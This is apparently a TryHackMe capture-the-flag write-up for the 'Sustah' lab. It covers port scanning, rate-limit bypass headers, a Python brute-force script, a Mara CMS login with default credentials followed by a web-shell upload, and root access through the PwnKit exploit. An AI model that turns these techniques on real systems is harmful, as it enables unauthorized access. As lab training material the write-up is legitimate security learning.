----------------

### CTF:TRYHACKME
### LAB:SUSTAH

----------------

![image](https://github.com/user-attachments/assets/3532c973-c888-41ab-a3ff-a45bd412952d)

-----------------

### Reconnaissance

- Rustscan's output

      ❯ rustscan -a 10.10.239.27 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.239.27:22
      Open 10.10.239.27:80
      Open 10.10.239.27:8085
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 06:51 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 0.00s elapsed
      Initiating Ping Scan at 06:51
      Scanning 10.10.239.27 [2 ports]
      Completed Ping Scan at 06:51, 0.20s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 06:51
      Completed Parallel DNS resolution of 1 host. at 06:51, 0.27s elapsed
      DNS resolution of 1 IPs took 0.30s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 06:51
      Scanning 10.10.239.27 [3 ports]
      Discovered open port 22/tcp on 10.10.239.27
      Discovered open port 80/tcp on 10.10.239.27
      Discovered open port 8085/tcp on 10.10.239.27
      Completed Connect Scan at 06:51, 0.18s elapsed (3 total ports)
      Initiating Service scan at 06:51
      Scanning 3 services on 10.10.239.27
      Completed Service scan at 06:51, 6.76s elapsed (3 services on 1 host)
      NSE: Script scanning 10.10.239.27.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 7.61s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 1.03s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:51
      Completed NSE at 06:51, 0.01s elapsed
      Nmap scan report for 10.10.239.27
      Host is up, received syn-ack (0.19s latency).
      Scanned at 2024-08-21 06:51:04 EDT for 16s
      
      PORT     STATE SERVICE REASON  VERSION
      22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zuGtMGKQdFrh6Y8Dgwdo7815klLm7VzG05KNvT112MyF41Vxz+915iRz9nTSQ583i1cmjHp+q+fMq+QGiO0iwIdYN72jop6oFxqyaO2ZjBE3grWHSP2xMsTZc7qXgPu9ZxzVAfc/4mETA8B00yc6XNApJUwfJOYz/qt/pb0WHDVBQLYesg+rrr3UZDrj9L7KNFlW74mT0nzace0yqtcV//dgOMiG8CeS6TRyUG6clbSUdr+yfgPOrcUwhTCMRKv2e30T5naBZ60e1jSuXYmQfmeZtDZ4hdsBWDfOnGnw89O9Ak+VhULGYq/ZxTh31dnWBULftw/l6saLaUJEaVeb
      |   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENNM4XJDFEnfvomDQgg0n7ZF+bHK+/x0EYcjrLP2BGgytEp7yg7A36KajE2QYkQKtHGPamSRLzNWmJpwzaV65w=
      |   256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOd1NxUo0xJ3krpRI1Xm8KMCFXziZngofs/wjOkofKKV
      80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: OPTIONS GET HEAD POST
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: Susta
      8085/tcp open  http    syn-ack Gunicorn 20.0.4
      | http-methods: 
      |_  Supported Methods: POST GET HEAD OPTIONS
      |_http-server-header: gunicorn/20.0.4
      |_http-title: Spinner
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Port `8085` presents a spinner game
![image](https://github.com/user-attachments/assets/61be41fd-5b25-4cbb-9c1b-b04a9487dbb0)

- The developers added a rate limit mechanism to the game to prevent bruteforce.

![image](https://github.com/user-attachments/assets/ae9e7e98-4376-4bb4-b388-2c4eb018c3fd)

- I got a list of headers to bypass the rate limit fro [hacktrickz](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass)

      X-Originating-IP: 127.0.0.1
      X-Forwarded-For: 127.0.0.1
      X-Remote-IP: 127.0.0.1
      X-Remote-Addr: 127.0.0.1
      X-Client-IP: 127.0.0.1
      X-Host: 127.0.0.1
      X-Forwared-Host: 127.0.0.1
      
- Headers `X-Remote-Addr` and `X-Forwarded-Host` did trick and bypassed the rate limit

![image](https://github.com/user-attachments/assets/c456cd55-7e21-4dbb-8c02-9089d1a15c02)

- I wrote a script to bruteforce the number.

      #! /usr/bin/env python3
      import requests
      
      headers = {"X-Remote-Addr":"127.0.0.1","X-Forwarded-Host": "127.0.0.1","Content-Type":"application/x-www-form-urlencoded"}
      
      for i in range(9999,99999):
          data =  {"number": i}
          ip = "10.10.61.14"
          failMessage = "Oh no! How unlucky. Spin the wheel and try again."
          response = requests.post(f"http://{ip}:8085/",headers=headers,data=data).text
          if failMessage in response:
              print(f"[+]Path not in number {i}")
          else:
              print(response)
              break

- Path spotted in number `10921`
  
            [+]Path not in number 10920
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Spinner</title>
                <link rel="stylesheet" href="/static/style.css">
            </head>
            <body>
              <strong>0</strong>
                <h1>Spinner Wheel</h1>
                <div class="container">
            <ul class="imglist">
              <li  ><img src="/static/arrow.png" alt="arrow"></li>
              <li><img src="/static/wheel.png" alt="wheel"></li>
            </ul>
                  
                  
            
                </div>
                <h2>Spin the wheel</h2>
                <div id="spin">
                    <button  class="spin-btn">spin</button>
                </div>
                <label for="number">Feeling lucky? Guess the right number. You have a 0.004% chance of winning.</label>
            
                <form  method="post" class="inputs">
                    <input placeholder="Input" type="number" name="number">
                    <button type="submit" class="btn draw-border">Click</button>
            
                </form>
                <h3>path: /YouGotTh3P@th</h3>
            
                
            
            </body>
            <script src="/static/index.js"></script>
            
            </html>

![image](https://github.com/user-attachments/assets/e27e428d-04f1-4f19-b1ba-2b0458c245dd)

---------------------------

### EXPLOITING MARA CMS 

-  Directory `/YouGotTh3P@th` hosts `MARACMS-7.5` which has an authenticated file upload [exploit](https://www.exploit-db.com/exploits/48780)

![image](https://github.com/user-attachments/assets/fa4e2c54-617c-477c-a6bf-0fe130d1c2c1)

- The page  creators forgot to change the default creds `admin:changeme`.We can login as user `admin` and upload a web shell.

![image](https://github.com/user-attachments/assets/ca8111a3-9fb2-44a6-8fe2-5c8ccf5b9060)

- The file functionality allows us to write files.

![image](https://github.com/user-attachments/assets/221d3dcd-a775-4fff-953f-8d0df6ebc40f)

- Upload to directory `template/`

![image](https://github.com/user-attachments/assets/2af81d51-13a5-447b-a82f-d01df9ee85a5)

- Command injection

![image](https://github.com/user-attachments/assets/85aa3e28-8406-4165-adee-cb580da78973)

-------------------------

### Initial Foothold

- Shell access

![image](https://github.com/user-attachments/assets/dabf4356-cb0b-4544-abc6-f74b882a8035)

- I was able to get user `kiran` password  from an hidden file in `/var/backups/`

![image](https://github.com/user-attachments/assets/feb18e78-ee7a-4a21-b896-44ab10765846)

- User Kiran

![image](https://github.com/user-attachments/assets/493a0895-a099-4e29-9038-f29ef94570c8)

-------------------------

### Privesc with PWNKIT 

- The machine is vulnerable to `CVE-2021-4034 - Pkexec Local Privilege Escalation`.I got an exploit from this [github repo](https://github.com/ly4k/PwnKit)

- Root

![image](https://github.com/user-attachments/assets/4e1b36c2-f30f-4301-b81c-87553a1fe977)

------------------------

### REFERENCES:
- [PWNKIT](https://github.com/ly4k/PwnKit)
- [MARACMS](https://www.exploit-db.com/exploits/48780)

------------------------

### THANKS FOR READING!!!!

-------------------------









